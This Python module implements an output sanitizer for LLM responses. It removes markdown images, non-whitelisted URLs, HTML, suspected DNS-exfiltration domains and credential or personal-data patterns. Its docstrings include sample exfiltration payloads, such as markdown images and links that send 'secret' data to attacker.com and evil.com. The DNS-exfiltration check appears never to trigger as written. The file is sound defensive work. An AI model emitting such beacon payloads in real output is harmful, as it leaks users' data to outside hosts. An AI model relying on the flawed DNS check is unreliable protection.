"""
Output sanitization for LLM responses.

Removes potential data exfiltration vectors from LLM outputs including:
- External URLs (markdown links and images)
- DNS exfiltration attempts
- Embedded scripts or code execution
- Sensitive data patterns
"""
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

from ..config import security_config
from ..exceptions import DataExfiltrationAttempt
from src.core.logging_config import get_logger

logger = get_logger("output_sanitizer")


class OutputSanitizer:
    """
    Sanitize LLM outputs to prevent data exfiltration.
    
    Based on research showing attackers can use:
    - Markdown images: ![](http://attacker.com/exfil?data=secret)
    - URL encoding: http://attacker.com/?data=<encoded_secret>
    - DNS queries: secret.data.attacker.com
    
    Example:
        >>> sanitizer = OutputSanitizer()
        >>> response = "Check this: ![image](http://evil.com/steal?data=secret123)"
        >>> clean = sanitizer.sanitize(response)
        >>> # Returns: "Check this: [Image Removed - Security]"
    """
    
    def __init__(self, config: Optional[Any] = None):
        """
        Initialize output sanitizer.
        
        Args:
            config: Security configuration (uses global config if not provided)
        """
        self.config = config or security_config
        
        # Compile regex patterns for performance
        self._compile_patterns()
        
    def _compile_patterns(self):
        """Compile regex patterns for efficient matching."""
        # Markdown image pattern: ![alt](url)
        self.markdown_image_pattern = re.compile(
            r'!\[([^\]]*)\]\(([^)]+)\)',
            re.IGNORECASE
        )
        
        # Markdown link pattern: [text](url)
        self.markdown_link_pattern = re.compile(
            r'\[([^\]]+)\]\(([^)]+)\)',
            re.IGNORECASE
        )
        
        # Direct HTTP(S) URLs
        self.url_pattern = re.compile(
            r'https?://[^\s<>"{}|\\^`\[\]]+',
            re.IGNORECASE
        )
        
        # Potential DNS exfiltration (subdomain with suspicious patterns)
        self.dns_exfil_pattern = re.compile(
            r'[a-zA-Z0-9][-a-zA-Z0-9]{10,}\.[a-z]{2,}',
            re.IGNORECASE
        )
        
        # Base64 encoded data in URLs (common exfiltration technique)
        self.base64_url_pattern = re.compile(
            r'[?&][\w]+=([A-Za-z0-9+/]{20,}={0,2})',
            re.IGNORECASE
        )
        
        # HTML tags (potential XSS or script injection)
        self.html_tag_pattern = re.compile(
            r'<[^>]+>',
            re.IGNORECASE
        )

        # Sensitive data patterns
        self.api_key_pattern = re.compile(
            r'(api[_-]?key|token|secret|password|bearer)["\']?\s*[:=]\s*["\']?[\w\-\.]+',
            re.IGNORECASE
        )

        # SSN pattern
        self.ssn_pattern = re.compile(r'\b\d{3}-\d{2}-\d{4}\b')

        # Credit card pattern (basic)
        self.credit_card_pattern = re.compile(r'\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b')
    
    def sanitize(
        self,
        text: str,
        remove_all_urls: bool = None,
        remove_html: bool = True
    ) -> str:
        """
        Sanitize text by removing potential exfiltration vectors.
        
        Args:
            text: Text to sanitize
            remove_all_urls: Override config setting for URL removal
            remove_html: Remove HTML tags (default: True)
            
        Returns:
            Sanitized text
            
        Example:
            >>> sanitizer.sanitize("Visit http://evil.com and ![](http://bad.com/img.png)")
            'Visit [URL Removed - Security] and [Image Removed - Security]'
        """
        original_text = text
        sanitization_log = []
        
        # 1. Remove markdown images (highest priority - common exfil vector)
        if self.config.block_markdown_images:
            text, img_count = self._remove_markdown_images(text)
            if img_count > 0:
                sanitization_log.append(f"removed_{img_count}_images")
        
        # 2. Filter URLs (keep only whitelisted domains)
        remove_urls = remove_all_urls if remove_all_urls is not None else not self.config.allow_external_urls
        if remove_urls:
            text, url_count = self._filter_urls(text)
            if url_count > 0:
                sanitization_log.append(f"removed_{url_count}_urls")
        
        # 3. Remove HTML tags
        if remove_html:
            text, html_count = self._remove_html_tags(text)
            if html_count > 0:
                sanitization_log.append(f"removed_{html_count}_html_tags")
        
        # 4. Check for DNS exfiltration patterns
        if self.config.block_dns_exfiltration:
            text, dns_count = self._remove_dns_exfiltration(text)
            if dns_count > 0:
                sanitization_log.append(f"blocked_{dns_count}_dns_exfil_attempts")

        # 5. Redact sensitive data patterns
        text, sensitive_count = self._redact_sensitive_data(text)
        if sensitive_count > 0:
            sanitization_log.append(f"redacted_{sensitive_count}_sensitive_patterns")

        # Log if sanitization occurred
        if sanitization_log:
            logger.warning(
                "Output sanitization performed",
                extra={
                    "actions": sanitization_log,
                    "original_length": len(original_text),
                    "sanitized_length": len(text)
                }
            )

        return text
    
    def _remove_markdown_images(self, text: str) -> tuple[str, int]:
        """Remove markdown images and return (sanitized_text, count)."""
        count = len(self.markdown_image_pattern.findall(text))
        if count > 0:
            text = self.markdown_image_pattern.sub('[Image Removed - Security]', text)
        return text, count
    
    def _filter_urls(self, text: str) -> tuple[str, int]:
        """Remove or filter URLs based on whitelist."""
        # First handle markdown links
        markdown_links = self.markdown_link_pattern.findall(text)
        removed_count = 0
        
        for link_text, url in markdown_links:
            if not self._is_url_allowed(url):
                text = text.replace(f'[{link_text}]({url})', f'[{link_text}] [URL Removed - Security]')
                removed_count += 1
        
        # Then handle direct URLs
        direct_urls = self.url_pattern.findall(text)
        for url in direct_urls:
            if not self._is_url_allowed(url):
                text = text.replace(url, '[URL Removed - Security]')
                removed_count += 1
        
        return text, removed_count
    
    def _is_url_allowed(self, url: str) -> bool:
        """Check if URL is in allowed domains list."""
        if not self.config.allowed_domains:
            return False
        
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            
            # Check against whitelist
            for allowed in self.config.allowed_domains:
                if domain == allowed.lower() or domain.endswith('.' + allowed.lower()):
                    return True
            
            return False
        except Exception:
            # If URL parsing fails, block it
            return False
    
    def _remove_html_tags(self, text: str) -> tuple[str, int]:
        """Remove HTML tags and return (sanitized_text, count)."""
        count = len(self.html_tag_pattern.findall(text))
        if count > 0:
            text = self.html_tag_pattern.sub('', text)
        return text, count
    
    def _remove_dns_exfiltration(self, text: str) -> tuple[str, int]:
        """
        Detect and remove potential DNS exfiltration attempts.
        
        DNS exfiltration uses long subdomains to encode data:
        c2VjcmV0ZGF0YQ.attacker.com (base64 encoded)
        """
        suspicious_domains = []
        
        # Find potential DNS exfil patterns
        for match in self.dns_exfil_pattern.finditer(text):
            domain = match.group(0)
            
            # Check if domain looks suspicious (very long subdomain)
            parts = domain.split('.')
            if len(parts) > 2:  # Has subdomain
                subdomain = parts[0]
                if len(subdomain) > 15:  # Suspiciously long subdomain
                    suspicious_domains.append(domain)
        
        # Remove suspicious domains
        for domain in suspicious_domains:
            text = text.replace(domain, '[Suspicious Domain Removed]')

        return text, len(suspicious_domains)

    def _redact_sensitive_data(self, text: str) -> tuple[str, int]:
        """
        Redact sensitive data patterns (API keys, tokens, SSN, credit cards).

        Returns:
            (sanitized_text, count_of_redactions)
        """
        redaction_count = 0

        # Redact API keys, tokens, secrets, passwords
        api_key_matches = self.api_key_pattern.findall(text)
        if api_key_matches:
            text = self.api_key_pattern.sub('[CREDENTIALS REDACTED]', text)
            redaction_count += len(api_key_matches)

        # Redact SSN
        ssn_matches = self.ssn_pattern.findall(text)
        if ssn_matches:
            text = self.ssn_pattern.sub('[SSN REDACTED]', text)
            redaction_count += len(ssn_matches)

        # Redact credit card numbers
        cc_matches = self.credit_card_pattern.findall(text)
        if cc_matches:
            text = self.credit_card_pattern.sub('[CREDIT CARD REDACTED]', text)
            redaction_count += len(cc_matches)

        return text, redaction_count

    def detect_exfiltration_attempts(self, text: str) -> List[Dict[str, Any]]:
        """
        Detect potential exfiltration attempts without modifying text.
        
        Returns:
            List of detected attempts with details
            
        Example:
            >>> attempts = sanitizer.detect_exfiltration_attempts(response)
            >>> if attempts:
            ...     raise DataExfiltrationAttempt(
            ...         vector=attempts[0]['vector'],
            ...         blocked_content=attempts[0]['content']
            ...     )
        """
        attempts = []
        
        # Check for markdown images
        images = self.markdown_image_pattern.findall(text)
        for alt_text, url in images:
            attempts.append({
                'vector': 'markdown_image',
                'content': url,
                'risk': 'high',
                'description': 'Markdown image can be used for data exfiltration'
            })
        
        # Check for URLs with base64 encoded data
        urls = self.url_pattern.findall(text)
        for url in urls:
            if self.base64_url_pattern.search(url):
                attempts.append({
                    'vector': 'base64_url_encoding',
                    'content': url,
                    'risk': 'high',
                    'description': 'URL contains base64 encoded data (potential exfiltration)'
                })
            elif not self._is_url_allowed(url):
                attempts.append({
                    'vector': 'external_url',
                    'content': url,
                    'risk': 'medium',
                    'description': 'External URL to non-whitelisted domain'
                })
        
        # Check for DNS exfiltration
        for match in self.dns_exfil_pattern.finditer(text):
            domain = match.group(0)
            parts = domain.split('.')
            if len(parts) > 2 and len(parts[0]) > 15:
                attempts.append({
                    'vector': 'dns_exfiltration',
                    'content': domain,
                    'risk': 'high',
                    'description': 'Suspicious long subdomain (potential DNS exfiltration)'
                })
        
        return attempts
    
    def sanitize_with_report(self, text: str) -> Dict[str, Any]:
        """
        Sanitize text and return detailed report.
        
        Returns:
            {
                'sanitized_text': str,
                'attempts_detected': List[Dict],
                'items_removed': int,
                'is_clean': bool
            }
        """
        attempts = self.detect_exfiltration_attempts(text)
        sanitized = self.sanitize(text)
        
        return {
            'sanitized_text': sanitized,
            'attempts_detected': attempts,
            'items_removed': len(attempts),
            'is_clean': len(attempts) == 0,
            'original_length': len(text),
            'sanitized_length': len(sanitized)
        }
